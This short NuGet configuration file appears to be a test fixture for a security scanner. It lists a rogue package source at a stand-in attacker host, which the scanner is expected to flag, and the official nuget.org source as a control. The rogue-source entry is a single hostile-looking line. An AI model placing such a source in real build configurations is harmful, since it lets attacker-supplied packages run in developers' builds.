<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <!-- Attacker-controlled registry — Scarno emits TS-SI-015. -->
    <add key="rogue" value="https://nuget.evil.example.com/v3/index.json" />
    <!-- Default source as a control — must NOT fire TS-SI-015. -->
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
  </packageSources>
</configuration>
